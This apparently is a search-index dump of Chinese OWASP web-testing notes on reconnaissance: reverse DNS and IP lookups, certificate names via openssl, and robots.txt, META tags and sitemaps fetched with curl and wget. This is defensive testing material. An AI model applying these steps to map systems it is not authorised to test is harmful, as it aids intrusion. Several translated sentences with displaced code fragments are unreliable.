\u8bb0\u5f55\u3002\u4e0d\u8981\u8bf7\u6c42\u533a\u57df\u4f20\u8f93\uff0c\u800c\u662f\u5c1d\u8bd5\u5c06\u8bb0\u5f55\u7c7b\u578b\u8bbe\u7f6e\u4e3a PTR \u5e76\u5728\u7ed9\u5b9a\u7684 IP \u5730\u5740\u4e0a\u53d1\u51fa\u67e5\u8be2\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e78\u8fd0\u7684\u8bdd\uff0c\u4ed6\u4eec\u53ef\u80fd\u4f1a\u5f97\u5230\u4e00\u4e2a DNS \u540d\u79f0\u6761\u76ee\u3002\u6b64\u6280\u672f\u4f9d\u8d56\u4e8e IP \u5230\u7b26\u53f7\u540d\u79f0\u6620\u5c04\u7684\u5b58\u5728\uff0c\u4f46\u4e0d\u80fd\u4fdd\u8bc1\u8fd9\u4e00\u70b9\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#web-dns","title":"\u57fa\u4e8e Web \u7684 DNS \u641c\u7d22","text":"<p>\u8fd9\u79cd\u641c\u7d22\u7c7b\u4f3c\u4e8e DNS \u533a\u57df\u4f20\u8f93\uff0c\u4f46\u4f9d\u8d56\u4e8e\u5728 DNS \u4e0a\u542f\u7528\u57fa\u4e8e\u540d\u79f0\u7684\u641c\u7d22\u7684\u57fa\u4e8e Web \u7684\u670d\u52a1\u3002\u5176\u4e2d\u4e00\u9879\u670d\u52a1\u662fNetcraft \u641c\u7d22 DNS\u670d\u52a1\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u67e5\u8be2\u5c5e\u4e8e\u60a8\u9009\u62e9\u7684\u57df\u7684\u540d\u79f0\u5217\u8868\uff0c\u4f8b\u5982<code>example.com</code>.\u00a0\u7136\u540e\u4ed6\u4eec\u5c06\u68c0\u67e5\u4ed6\u4eec\u83b7\u5f97\u7684\u540d\u79f0\u662f\u5426\u4e0e\u4ed6\u4eec\u6b63\u5728\u68c0\u67e5\u7684\u76ee\u6807\u76f8\u5173\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#ip","title":"\u53cd\u5411 IP \u670d\u52a1","text":"<p>\u53cd\u5411 IP \u670d\u52a1\u7c7b\u4f3c\u4e8e DNS \u53cd\u5411\u67e5\u8be2\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u6d4b\u8bd5\u4eba\u5458\u67e5\u8be2\u57fa\u4e8e Web \u7684\u5e94\u7528\u7a0b\u5e8f\u800c\u4e0d\u662f\u540d\u79f0\u670d\u52a1\u5668\u3002\u6709\u8bb8\u591a\u8fd9\u6837\u7684\u670d\u52a1\u53ef\u7528\u3002\u7531\u4e8e\u5b83\u4eec\u503e\u5411\u4e8e\u8fd4\u56de\u90e8\u5206\uff08\u5e76\u4e14\u901a\u5e38\u662f\u4e0d\u540c\u7684\uff09\u7ed3\u679c\uff0c\u56e0\u6b64\u6700\u597d\u4f7f\u7528\u591a\u79cd\u670d\u52a1\u6765\u83b7\u5f97\u66f4\u5168\u9762\u7684\u5206\u6790\u3002</p> <ul> <li>MxToolbox \u53cd\u5411 IP</li> <li>DNSstuff\uff08\u63d0\u4f9b\u591a\u79cd\u670d\u52a1\uff09</li> <li>Net Square\uff08\u57df\u540d\u548cIP\u5730\u5740\u7684\u591a\u6b21\u67e5\u8be2\uff0c\u9700\u8981\u5b89\u88c5\uff09</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_4","title":"\u8c37\u6b4c\u641c\u7d22","text":"<p>\u4ece\u4ee5\u524d\u7684\u6280\u672f\u6536\u96c6\u4fe1\u606f\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f9d\u9760\u641c\u7d22\u5f15\u64ce\u6765\u6539\u8fdb\u548c\u589e\u52a0\u4ed6\u4eec\u7684\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u4f1a\u4ea7\u751f\u5c5e\u4e8e\u76ee\u6807\u7684\u5176\u4ed6\u7b26\u53f7\u540d\u79f0\u7684\u8bc1\u636e\uff0c\u6216\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u660e\u663e\u7684 URL \u8bbf\u95ee\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u4f8b\u5982\uff0c\u8003\u8651\u524d\u9762\u5173\u4e8e \u7684\u793a\u4f8b<code>www.owasp.org</code>\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u67e5\u8be2 Google \u548c\u5176\u4ed6\u641c\u7d22\u5f15\u64ce\u4ee5\u67e5\u627e\u4e0e\u65b0\u53d1\u73b0\u7684\u57df \u3001 \u548c \u76f8\u5173\u7684\u4fe1\u606f\uff08\u56e0\u6b64\uff0cDNS<code>webgoat.org</code>\u540d\u79f0<code>webscarab.com</code>\uff09<code>webscarab.net</code>\u3002</p> <p>\u8c37\u6b4c\u641c\u7d22\u6280\u672f\u5728\u6d4b\u8bd5\uff1a\u8718\u86db\u3001\u673a\u5668\u4eba\u548c\u722c\u866b\u4e2d\u6709\u89e3\u91ca\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_5","title":"\u6570\u5b57\u8bc1\u4e66","text":"<p>\u5982\u679c\u670d\u52a1\u5668\u63a5\u53d7\u901a\u8fc7 HTTPS \u7684\u8fde\u63a5\uff0c\u5219\u8bc1\u4e66\u4e0a\u7684\u901a\u7528\u540d\u79f0 (CN) \u548c\u4e3b\u9898\u5907\u7528\u540d\u79f0 (SAN) \u53ef\u80fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u4e3b\u673a\u540d\u3002\u4f46\u662f\uff0c\u5982\u679c\u7f51\u7edc\u670d\u52a1\u5668\u6ca1\u6709\u53d7\u4fe1\u4efb\u7684\u8bc1\u4e66\uff0c\u6216\u8005\u6b63\u5728\u4f7f\u7528\u901a\u914d\u7b26\uff0c\u5219\u53ef\u80fd\u4e0d\u4f1a\u8fd4\u56de\u4efb\u4f55\u6709\u6548\u4fe1\u606f\u3002</p> <p>CN\u548cSAN\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u67e5\u770b\u8bc1\u4e66\u83b7\u53d6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7OpenSSL\u7b49\u5176\u4ed6\u5de5\u5177\u83b7\u53d6\uff1a</p> <pre><code>openssl s_client -connect 93.184.216.34:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'\n\nSubject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_6","title":"\u5de5\u5177","text":"<ul> <li><code>nslookup</code>DNS \u67e5\u627e\u5de5\u5177\uff0c\u4f8b\u5982<code>dig</code>\u548c\u7c7b\u4f3c\u7684\u5de5\u5177\u3002</li> <li>\u641c\u7d22\u5f15\u64ce\uff08Google\u3001Bing \u548c\u5176\u4ed6\u4e3b\u8981\u641c\u7d22\u5f15\u64ce\uff09\u3002</li> <li>\u4e13\u95e8\u7684 DNS \u76f8\u5173\u7684\u57fa\u4e8e Web \u7684\u641c\u7d22\u670d\u52a1\uff1a\u89c1\u6b63\u6587\u3002</li> <li>\u5730\u56fe</li> <li>Nessus \u6f0f\u6d1e\u626b\u63cf\u7a0b\u5e8f</li> <li>\u5c3c\u514b\u6258</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"\u68c0\u67e5\u7f51\u7edc\u670d\u52a1\u5668\u56fe\u5143\u6587\u4ef6\u662f\u5426\u6709\u4fe1\u606f\u6cc4\u9732","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_1","title":"\u6982\u62ec","text":"<p>\u672c\u8282\u4ecb\u7ecd\u5982\u4f55\u6d4b\u8bd5\u5404\u79cd\u5143\u6570\u636e\u6587\u4ef6\u662f\u5426\u5b58\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u8def\u5f84\u6216\u529f\u80fd\u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u6b64\u5916\uff0c\u8718\u86db\u3001\u673a\u5668\u4eba\u6216\u722c\u866b\u8981\u907f\u514d\u7684\u76ee\u5f55\u5217\u8868\u4e5f\u53ef\u4ee5\u521b\u5efa\u4e3a\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u6620\u5c04\u6267\u884c\u8def\u5f84\u7684\u4f9d\u8d56\u9879\u3002\u8fd8\u53ef\u4ee5\u6536\u96c6\u5176\u4ed6\u4fe1\u606f\u4ee5\u8bc6\u522b\u653b\u51fb\u9762\u3001\u6280\u672f\u7ec6\u8282\u6216\u7528\u4e8e\u793e\u4f1a\u5de5\u7a0b\u53c2\u4e0e\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u901a\u8fc7\u5206\u6790\u5143\u6570\u636e\u6587\u4ef6\u8bc6\u522b\u9690\u85cf\u6216\u6df7\u6dc6\u7684\u8def\u5f84\u548c\u529f\u80fd\u3002</li> <li>\u63d0\u53d6\u5e76\u6620\u5c04\u53ef\u80fd\u5bfc\u81f4\u66f4\u597d\u5730\u4e86\u89e3\u624b\u5934\u7cfb\u7edf\u7684\u5176\u4ed6\u4fe1\u606f\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4e0b\u9762\u7528 \u6267\u884c\u7684\u4efb\u4f55\u64cd\u4f5c<code>wget</code>\u4e5f\u53ef\u4ee5\u7528 \u5b8c\u6210<code>curl</code>\u3002\u8bb8\u591a\u52a8\u6001\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5 (DAST) \u5de5\u5177\uff08\u4f8b\u5982 ZAP \u548c Burp Suite\uff09\u90fd\u5305\u542b\u5bf9\u8fd9\u4e9b\u8d44\u6e90\u7684\u68c0\u67e5\u6216\u89e3\u6790\uff0c\u4f5c\u4e3a\u5176\u8718\u86db/\u722c\u866b\u529f\u80fd\u7684\u4e00\u90e8\u5206\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdGoogle Dorks\u6216\u5229\u7528\u8bf8\u5982<code>inurl:</code>.</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_4","title":"\u673a\u5668\u4eba","text":"<p>Web Spiders\u3001Robots \u6216 Crawlers \u68c0\u7d22\u7f51\u9875\uff0c\u7136\u540e\u9012\u5f52\u904d\u5386\u8d85\u94fe\u63a5\u4ee5\u68c0\u7d22\u66f4\u591a\u7684 Web \u5185\u5bb9\u3002\u5b83\u4eec\u53ef\u63a5\u53d7\u7684\u884c\u4e3a\u7531Web \u6839\u76ee\u5f55\u4e2d\u7684robots.txt\u6587\u4ef6\u7684\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u6307\u5b9a\u3002</p> <p>\u4f8b\u5982\uff0c\u4e0b\u9762\u5f15\u7528\u4e86 2020 \u5e74 5 \u6708 5 \u65e5\u4eceGoogle<code>robots.txt</code>\u91c7\u6837\u7684\u6587\u4ef6\u7684\u5f00\u5934\uff1a</p> <pre><code>User-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\nDisallow: /sdch\n...\n</code></pre> <p>User-Agent\u6307\u4ee4\u662f\u6307\u7279\u5b9a\u7684\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u3002\u4f8b\u5982\uff0c<code>User-Agent: Googlebot</code>\u6307\u7684\u662f\u6765\u81ea\u8c37\u6b4c\u7684\u8718\u86db\uff0c\u800c<code>User-Agent: bingbot</code>\u6307\u7684\u662f\u6765\u81ea\u5fae\u8f6f\u7684\u722c\u866b\u3002<code>User-Agent: *</code>\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u9002\u7528\u4e8e\u6240\u6709\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u3002</p> <p>\u8be5<code>Disallow</code>\u6307\u4ee4\u6307\u5b9a\u54ea\u4e9b\u8d44\u6e90\u88ab\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u7981\u6b62\u3002\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u7981\u6b62\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>...\nDisallow: /search\n...\nDisallow: /sdch\n...\n</code></pre> <p>\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u53ef\u4ee5\u6545\u610f\u5ffd\u7565<code>Disallow</code>\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684\u6307\u4ee4<code>robots.txt</code>\u3002\u56e0\u6b64\uff0c<code>robots.txt</code>\u4e0d\u5e94\u5c06\u5176\u89c6\u4e3a\u5bf9\u7b2c\u4e09\u65b9\u8bbf\u95ee\u3001\u5b58\u50a8\u6216\u91cd\u65b0\u53d1\u5e03 Web \u5185\u5bb9\u7684\u65b9\u5f0f\u5b9e\u65bd\u9650\u5236\u7684\u673a\u5236\u3002</p> <p>\u8be5<code>robots.txt</code>\u6587\u4ef6\u662f\u4ece Web \u670d\u52a1\u5668\u7684 Web \u6839\u76ee\u5f55\u4e2d\u68c0\u7d22\u7684\u3002\u4f8b\u5982\uff0c\u8981\u4f7f\u7528or\u68c0\u7d22<code>robots.txt</code>from\u00a0\uff1a<code>www.google.com``wget``curl</code></p> <pre><code>$ curl -O -Ss http://www.google.com/robots.txt &amp;&amp; head -n5 robots.txt\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\n...\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#google-robotstxt","title":"\u4f7f\u7528 Google \u7f51\u7ad9\u7ad9\u957f\u5de5\u5177\u5206\u6790 robots.txt","text":"<p>\u7f51\u7ad9\u6240\u6709\u8005\u53ef\u4ee5\u4f7f\u7528 Google \u7684\u201cAnalyze robots.txt\u201d\u529f\u80fd\u6765\u5206\u6790\u7f51\u7ad9\uff0c\u4f5c\u4e3a\u5176Google \u7f51\u7ad9\u7ba1\u7406\u5458\u5de5\u5177\u7684\u4e00\u90e8\u5206\u3002\u8be5\u5de5\u5177\u53ef\u4ee5\u8f85\u52a9\u6d4b\u8bd5\uff0c\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u4f7f\u7528 Google \u5e10\u6237\u767b\u5f55 Google \u7f51\u7ad9\u7ad9\u957f\u5de5\u5177\u3002</li> <li>\u5728\u4eea\u8868\u677f\u4e0a\uff0c\u8f93\u5165\u8981\u5206\u6790\u7684\u7ad9\u70b9\u7684 URL\u3002</li> <li>\u5728\u53ef\u7528\u65b9\u6cd5\u4e4b\u95f4\u8fdb\u884c\u9009\u62e9\uff0c\u7136\u540e\u6309\u7167\u5c4f\u5e55\u4e0a\u7684\u8bf4\u660e\u8fdb\u884c\u64cd\u4f5c\u3002</li> </ol>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_5","title":"\u5143\u6807\u7b7e","text":"<p><code>&lt;META&gt;</code>\u6807\u8bb0\u4f4d\u4e8e<code>HEAD</code>\u6bcf\u4e2a HTML \u6587\u6863\u7684\u90e8\u5206\u5185\uff0c\u5e76\u4e14\u5728\u673a\u5668\u4eba/\u8718\u86db/\u722c\u866b\u8d77\u70b9\u4e0d\u662f\u4ece webroot \u4ee5\u5916\u7684\u6587\u6863\u94fe\u63a5\uff08\u5373\u6df1\u5c42\u94fe\u63a5\uff09\u5f00\u59cb\u7684\u60c5\u51b5\u4e0b\uff0c\u5e94\u8be5\u5728\u6574\u4e2a\u7f51\u7ad9\u4e0a\u4fdd\u6301\u4e00\u81f4\u3002Robots \u6307\u4ee4\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7279\u5b9a\u7684META \u6807\u8bb0\u6765\u6307\u5b9a\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#meta","title":"\u673a\u5668\u4eba META \u6807\u7b7e","text":"<p>\u5982\u679c\u6ca1\u6709<code>&lt;META NAME=\"ROBOTS\" ... &gt;</code>\u6761\u76ee\uff0c\u5219\u201c\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u201d\u9ed8\u8ba4\u4e3a<code>INDEX,FOLLOW</code>\u5206\u522b\u3002\u56e0\u6b64\uff0c\u201c\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u201d\u5b9a\u4e49\u7684\u53e6\u5916\u4e24\u4e2a\u6709\u6548\u6761\u76ee\u4ee5<code>NO...</code>ie<code>NOINDEX</code>\u548c\u4e3a\u524d\u7f00<code>NOFOLLOW</code>\u3002</p> <p>\u6839\u636e webroot \u6587\u4ef6\u4e2d\u5217\u51fa\u7684 Disallow \u6307\u4ee4\uff0c\u5728\u6bcf\u4e2a\u7f51\u9875\u4e2d\u8fdb\u884c<code>robots.txt</code>\u6b63\u5219\u8868\u8fbe\u5f0f\u641c\u7d22\uff0c\u5e76\u5c06\u7ed3\u679c\u4e0e\u200b\u200b webroot \u4e2d\u7684\u6587\u4ef6\u8fdb\u884c\u6bd4\u8f83\u3002<code>&lt;META NAME=\"ROBOTS\"``robots.txt</code></p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_6","title":"\u6742\u9879\u5143\u4fe1\u606f\u6807\u7b7e","text":"<p>\u7ec4\u7ec7\u7ecf\u5e38\u5728 Web \u5185\u5bb9\u4e2d\u5d4c\u5165\u4fe1\u606f META \u6807\u7b7e\u4ee5\u652f\u6301\u5404\u79cd\u6280\u672f\uff0c\u4f8b\u5982\u5c4f\u5e55\u9605\u8bfb\u5668\u3001\u793e\u4ea4\u7f51\u7edc\u9884\u89c8\u3001\u641c\u7d22\u5f15\u64ce\u7d22\u5f15\u7b49\u3002\u6b64\u7c7b\u5143\u4fe1\u606f\u5bf9\u4e8e\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u6240\u4f7f\u7528\u7684\u6280\u672f\u4ee5\u53ca\u8981\u63a2\u7d22\u7684\u5176\u4ed6\u8def\u5f84/\u529f\u80fd\u53ef\u80fd\u5f88\u6709\u4ef7\u503c\u548c\u6d4b\u8bd5\u3002\u4ee5\u4e0b\u5143\u4fe1\u606f\u662f<code>www.whitehouse.gov</code>\u5728 2020 \u5e74 5 \u6708 5 \u65e5\u901a\u8fc7\u67e5\u770b\u9875\u9762\u6e90\u68c0\u7d22\u5230\u7684\uff1a</p> <pre><code>...\n&lt;meta property=\"og:locale\" content=\"en_US\" /&gt;\n&lt;meta property=\"og:type\" content=\"website\" /&gt;\n&lt;meta property=\"og:title\" content=\"The White House\" /&gt;\n&lt;meta property=\"og:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. \u2013 President Donald Trump.\" /&gt;\n&lt;meta property=\"og:url\" content=\"https://www.whitehouse.gov/\" /&gt;\n&lt;meta property=\"og:site_name\" content=\"The White House\" /&gt;\n&lt;meta property=\"fb:app_id\" content=\"1790466490985150\" /&gt;\n&lt;meta property=\"og:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta property=\"og:image:secure_url\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta name=\"twitter:card\" content=\"summary_large_image\" /&gt;\n&lt;meta name=\"twitter:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. \u2013 President Donald Trump.\" /&gt;\n&lt;meta name=\"twitter:title\" content=\"The White House\" /&gt;\n&lt;meta name=\"twitter:site\" content=\"@whitehouse\" /&gt;\n&lt;meta name=\"twitter:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta name=\"twitter:creator\" content=\"@whitehouse\" /&gt;\n...\n&lt;meta name=\"apple-mobile-web-app-title\" content=\"The White House\"&gt;\n&lt;meta name=\"application-name\" content=\"The White House\"&gt;\n&lt;meta name=\"msapplication-TileColor\" content=\"#0c2644\"&gt;\n&lt;meta name=\"theme-color\" content=\"#f5f5f5\"&gt;\n...\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_7","title":"\u7ad9\u70b9\u5730\u56fe","text":"<p>\u7ad9\u70b9\u5730\u56fe\u662f\u4e00\u4e2a\u6587\u4ef6\uff0c\u5f00\u53d1\u4eba\u5458\u6216\u7ec4\u7ec7\u53ef\u4ee5\u5728\u5176\u4e2d\u63d0\u4f9b\u6709\u5173\u7ad9\u70b9\u6216\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u9875\u9762\u3001\u89c6\u9891\u548c\u5176\u4ed6\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u5b83\u4eec\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u641c\u7d22\u5f15\u64ce\u53ef\u4ee5\u4f7f\u7528\u6b64\u6587\u4ef6\u66f4\u667a\u80fd\u5730\u63a2\u7d22\u60a8\u7684\u7f51\u7ad9\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528<code>sitemap.xml</code>\u6587\u4ef6\u6765\u4e86\u89e3\u6709\u5173\u7ad9\u70b9\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u4ece\u800c\u66f4\u5168\u9762\u5730\u63a2\u7d22\u5b83\u3002</p> <p>\u4ee5\u4e0b\u6458\u5f55\u81ea 2020 \u5e74 5 \u6708 5 \u65e5\u68c0\u7d22\u5230\u7684 Google \u4e3b\u8981\u7ad9\u70b9\u5730\u56fe\u3002</p> <pre><code>$ wget --no-verbose https://www.google.com/sitemap.xml &amp;&amp; head -n8 sitemap.xml\n2020-05-05 12:23:30 URL:https://www.google.com/sitemap.xml [2049] -&gt; \"sitemap.xml\" [1]\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;sitemapindex xmlns=\"http://www.google.com/schemas/sitemap/0.84\"&gt;\n  &lt;sitemap&gt;\n    &lt;loc&gt;https://www.google.com/gmail/sitemap.xml&lt;/loc&gt;\n  &lt;/sitemap&gt;\n  &lt;sitemap&gt;\n    &lt;loc&gt;https://www.google.com/forms/sitemaps.xml&lt;/loc&gt;\n  &lt;/sitemap&gt;\n...\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u5e0c\u671b\u4ece\u90a3\u91cc\u63a2\u7d22\u4ee5\u68c0\u7d22 gmail \u7ad9\u70b9\u5730\u56fe<code>https://www.google.com/gmail/sitemap.xml</code>\uff1a</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xhtml=\"http://www.w3.org/1999/xhtml\"&gt;\n  &lt;url&gt;\n    &lt;loc&gt;https://www.google.com/intl/am/gmail/about/&lt;/loc&gt;\n    &lt;xhtml:link href=\"https://www.google.com/gmail/about/\" hreflang=\"x-default\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/el/gmail/about/\" hreflang=\"el\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/it/gmail/about/\" hreflang=\"it\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/ar/gmail/about/\" hreflang=\"ar\" rel=\"alternate\"/&gt;\n...\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#txt","title":"\u5b89\u5168TXT","text":"<p>security.txt\u88ab IETF \u6279\u51c6\u4e3aRFC 9116 - 